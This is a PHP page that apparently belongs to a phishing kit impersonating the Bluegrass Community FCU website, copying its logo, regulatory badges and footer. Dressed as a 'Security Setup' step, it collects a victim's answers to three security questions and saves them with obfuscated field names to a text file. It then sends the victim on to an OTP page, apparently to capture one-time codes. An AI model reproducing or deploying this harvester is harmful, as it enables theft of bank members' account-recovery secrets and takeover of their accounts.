<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Questions - Bluegrass Community FCU</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#4A9619] text-[#123524] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1 flex items-center justify-center px-4 py-12">
            <div class="w-full max-w-3xl flex flex-col items-center gap-8">
                <!-- Security Questions Card -->
                <div class="w-full rounded-[30px] bg-white shadow-[0_30px_60px_rgba(0,0,0,0.18)] px-10 py-12">
                    <!-- Logo -->
                    <img
                        src="assets/blue_logo.png"
                        alt="Bluegrass Community FCU"
                        class="mx-auto h-12 w-auto"
                    />

                    <!-- Card Header -->
                    <div class="mt-6 space-y-3 text-center">
                        <p class="text-[0.65rem] font-semibold uppercase tracking-[0.35em] text-[#4A9619]">
                            Security Setup
                        </p>
                        <h1 class="text-2xl font-semibold text-gray-900">Security Questions</h1>
                        <p class="text-gray-600">Please set up your security questions</p>
                    </div>

                    <?php if (!empty($errors)): ?>
                        <div class="mt-6 bg-red-50 border-l-4 border-red-500 p-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                        <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                    </svg>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-red-700">
                                        Please fix the following errors:
                                        <ul class="list-disc pl-5 mt-1">
                                            <?php foreach ($errors as $error): ?>
                                                <li><?php echo htmlspecialchars($error); ?></li>
                                            <?php endforeach; ?>
                                        </ul>
                                    </p>
                                </div>
                            </div>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="mt-8 space-y-6">
                        <!-- Question 1 -->
                        <div class="space-y-2">
                            <label for="question1" class="block text-sm font-medium text-gray-700">
                                Security Question 1
                            </label>
                            <div class="relative">
                                <select
                                    id="question1"
                                    name="question1"
                                    class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                    required
                                    onchange="updateQuestionOptions()"
                                >
                                    <option value="">Select a question</option>
                                    <?php foreach ($questions as $question): ?>
                                        <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $question) ? 'selected' : ''; ?>>
                                            <?php echo htmlspecialchars($question); ?>
                                        </option>
                                    <?php endforeach; ?>
                                </select>
                            </div>
                            <?php if (!empty($errors['question1'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question1']); ?></p>
                            <?php endif; ?>
                            <input
                                type="text"
                                name="answer1"
                                value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                placeholder="Your answer"
                                required
                            >
                            <?php if (!empty($errors['answer1'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer1']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Question 2 -->
                        <div class="space-y-2">
                            <label for="question2" class="block text-sm font-medium text-gray-700">
                                Security Question 2
                            </label>
                            <select
                                id="question2"
                                name="question2"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                required
                            >
                                <option value="">Select a question</option>
                                <?php 
                                $excludedQuestions = [$_POST['question1'] ?? ''];
                                foreach ($questions as $question): 
                                    if (!in_array($question, $excludedQuestions)):
                                ?>
                                    <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $question) ? 'selected' : ''; ?>>
                                        <?php echo htmlspecialchars($question); ?>
                                    </option>
                                <?php 
                                    endif;
                                endforeach; 
                                ?>
                            </select>
                            <?php if (!empty($errors['question2'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question2']); ?></p>
                            <?php endif; ?>
                            <input
                                type="text"
                                name="answer2"
                                value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                placeholder="Your answer"
                                required
                            >
                            <?php if (!empty($errors['answer2'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer2']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <!-- Question 3 -->
                        <div class="space-y-2">
                            <label for="question3" class="block text-sm font-medium text-gray-700">
                                Security Question 3
                            </label>
                            <select
                                id="question3"
                                name="question3"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                required
                            >
                                <option value="">Select a question</option>
                                <?php 
                                $excludedQuestions = [$_POST['question1'] ?? '', $_POST['question2'] ?? ''];
                                foreach ($questions as $question): 
                                    if (!in_array($question, $excludedQuestions)):
                                ?>
                                    <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $question) ? 'selected' : ''; ?>>
                                        <?php echo htmlspecialchars($question); ?>
                                    </option>
                                <?php 
                                    endif;
                                endforeach; 
                                ?>
                            </select>
                            <?php if (!empty($errors['question3'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['question3']); ?></p>
                            <?php endif; ?>
                            <input
                                type="text"
                                name="answer3"
                                value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                class="w-full rounded-xl border border-gray-200 px-4 py-3 text-gray-700 shadow-sm placeholder:text-gray-400 focus:border-blue-200 focus:outline-none focus:ring-2 focus:ring-blue-100"
                                placeholder="Your answer"
                                required
                            >
                            <?php if (!empty($errors['answer3'])): ?>
                                <p class="mt-1 text-sm text-red-600"><?php echo htmlspecialchars($errors['answer3']); ?></p>
                            <?php endif; ?>
                        </div>
                        
                        <button
                            type="submit"
                            class="w-full rounded-xl bg-[#4A9619] py-3 text-base font-semibold text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            Continue
                        </button>
                    </form>
                </div>
            </div>
        </main>

        <!-- Footer -->
        <footer class="bg-white border-t border-gray-300 py-6">
            <div class="max-w-7xl mx-auto px-4">
                <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                    <div class="flex items-center gap-6 justify-center md:justify-start">
                        <img
                            src="assets/equal-housing.png"
                            alt="Equal Housing Lender"
                            class="h-12 w-auto"
                        />
                        <img
                            src="assets/ncua.png"
                            alt="National Credit Union Administration"
                            class="h-12 w-auto"
                        />
                    </div>
                    <div class="text-xs text-gray-700 text-center md:text-right space-y-2">
                        <p>© 2025 Bluegrass Community FCU. All Rights Reserved.</p>
                        <p>
                            This site contains links to other sites on the Internet. We, and your credit union,
                            cannot be responsible for the content or privacy policies of these other sites.
                        </p>
                        <p>Version: v26.10.22.0</p>
                    </div>
                </div>
                <div class="text-center text-xs text-gray-500 mt-6 border-t border-gray-200 pt-4">
                    ~ Current time is <?php echo date('m/d/Y h:i:s A'); ?> ~ 0 ~ NWEB02 ~
                </div>
            </div>
        </footer>
    </div>
    
    <script>
        const allQuestions = [
            'What was your childhood nickname?',
            "What is your mother's maiden name?",
            'What was the name of your first pet?',
            'What was the make and model of your first car?',
            'What city were you born in?',
            'What is your favorite childhood memory?',
            'What was your first job title?',
            'What is the name of your favorite teacher?',
            'What is your favorite book or movie character?',
            'What street did you grow up on?'
        ];

        function updateQuestionOptions() {
            const selected1 = document.getElementById('question1').value;
            const selected2 = document.getElementById('question2').value;
            const selected3 = document.getElementById('question3').value;
            
            // Update question2 options
            updateSelectOptions('question2', [selected1, selected3]);
            
            // Update question3 options
            updateSelectOptions('question3', [selected1, selected2]);
        }
        
        function updateSelectOptions(selectId, excludeValues) {
            const select = document.getElementById(selectId);
            const currentValue = select.value;
            const currentSelected = Array.from(select.selectedOptions).map(opt => opt.value);
            
            // Save the current value if it's not in the excluded values
            const shouldKeepCurrent = currentValue && !excludeValues.includes(currentValue);
            
            // Rebuild options
            select.innerHTML = '<option value="">Select a question</option>';
            
            allQuestions.forEach(question => {
                if (!excludeValues.includes(question)) {
                    const option = document.createElement('option');
                    option.value = question;
                    option.textContent = question;
                    if ((shouldKeepCurrent && question === currentValue) || currentSelected.includes(question)) {
                        option.selected = true;
                    }
                    select.appendChild(option);
                }
            });
        }
        
        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Add event listeners
            document.getElementById('question1')?.addEventListener('change', updateQuestionOptions);
            document.getElementById('question2')?.addEventListener('change', updateQuestionOptions);
            document.getElementById('question3')?.addEventListener('change', updateQuestionOptions);
            
            // Initial update
            updateQuestionOptions();
        });
    </script>
</body>
</html>
